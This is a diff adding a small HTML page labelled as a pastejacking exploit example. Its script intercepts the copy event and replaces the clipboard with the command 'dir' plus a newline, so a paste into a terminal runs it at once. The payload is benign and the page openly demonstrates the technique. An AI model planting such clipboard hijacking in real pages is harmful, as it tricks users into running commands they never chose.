@@ -1,0 +1,19 @@
+<html>
+<head>
+    <title>Pastejacking exploit example</title>
+    <meta name=viewport content="width=device-width, initial-scale=1">    
+</head>
+
+    <body>
+        <p>hola</p>
+        <script>
+            document.addEventListener('copy', function(e){
+                console.log(e);
+                e.clipboardData.setData('text/plain', 'dir\r\n');
+                e.preventDefault();
+            });
+        </script>
+    </body>
+
+</html>
+|
